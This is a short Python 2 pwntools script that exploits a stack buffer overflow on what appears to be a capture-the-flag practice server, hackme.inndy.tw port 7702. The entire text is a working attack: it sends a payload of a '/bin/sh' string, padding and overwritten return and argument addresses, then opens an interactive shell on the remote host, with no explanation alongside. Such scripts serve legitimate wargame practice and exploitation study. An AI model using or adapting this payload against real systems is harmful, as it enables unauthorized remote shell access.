#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

conn = connect('hackme.inndy.tw', 7702)
payload = '/bin/sh\x00' + 'A' * 0x10 + 'AAAA' + pack(0x08048649, 32) + pack(0x08049C60, 32)
conn.sendline(payload)
conn.interactive()
